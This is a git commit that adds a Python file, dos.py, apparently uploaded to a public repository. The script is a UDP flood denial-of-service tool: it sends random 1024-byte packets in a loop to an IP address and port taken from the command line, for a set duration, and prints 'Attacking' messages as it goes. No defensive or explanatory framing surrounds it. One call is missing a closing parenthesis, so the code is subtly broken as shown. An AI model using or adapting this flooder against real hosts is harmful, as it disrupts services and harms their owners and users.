a722d7926ca25a6d201c3009315575d720e0e5c4
racs101 <30850426+racs101@users.noreply.github.com>
2019-11-29 16:25:53 -0700

    Add files via upload

---
+++ dos.py
@@ -0,0 +1,38 @@
+import time, socket, sys, random
+
+def help():
+	print("Command: " + sys.argv[0] + " IP PORT TIME")
+
+def dosss(victim, vport, duration):
+	server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	bytes = random._urandom(1024)
+	timeout = (time.time() + duration)
+	sent = (1)
+
+	try:
+		while True:
+			if (time.time() > timeout):
+				break
+
+			else:
+				pass
+
+			server.sendto(bytes, (victim, vport))
+			sent = (sent + 1)
+			print("Attacking ", str(victim), " sent packages ", str(sent), " at port: ", str(vport))
+	
+	except KeyboardInterrupt:
+		sys.exit()
+
+
+def start():
+	if len(sys.argv) != 4:
+		help()
+	
+	else:
+		dosss(sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
+
+#if __name__ == '__main__':
+
+start()
+
